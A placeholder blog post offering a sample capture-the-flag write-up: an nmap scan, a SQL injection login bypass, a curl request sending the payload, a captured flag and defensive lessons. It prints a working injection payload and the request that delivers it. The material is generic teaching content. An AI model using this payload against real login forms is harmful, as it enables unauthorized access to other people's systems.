---
title: "Sample CTF Writeup"
date: "2024-01-15"
tags: ["CTF", "Web", "Security"]
---

# Sample CTF Writeup

This is a sample CTF writeup to demonstrate the blog functionality. You can replace this with your actual CTF writeups.

## Challenge Overview

The challenge was a web application with a simple login form. The goal was to bypass authentication and access the admin panel.

## Initial Reconnaissance

First, I performed a basic reconnaissance of the target:

```bash
nmap -sC -sV target.com
```

The scan revealed:
- Port 80: HTTP (Apache 2.4.41)
- Port 443: HTTPS (Apache 2.4.41)

## Vulnerability Discovery

After examining the login form, I noticed it was vulnerable to SQL injection:

```sql
' OR 1=1 --
```

## Exploitation

The payload successfully bypassed authentication:

```bash
curl -X POST http://target.com/login \
  -d "username=' OR 1=1 --&password=anything"
```

## Flag Capture

Once authenticated, I accessed the admin panel and found the flag:

```
FLAG{SQL_INJECTION_MASTER}
```

## Lessons Learned

- Always validate and sanitize user input
- Use parameterized queries to prevent SQL injection
- Implement proper authentication mechanisms

## Tools Used

- Nmap for port scanning
- Burp Suite for web application testing
- SQLMap for automated SQL injection testing 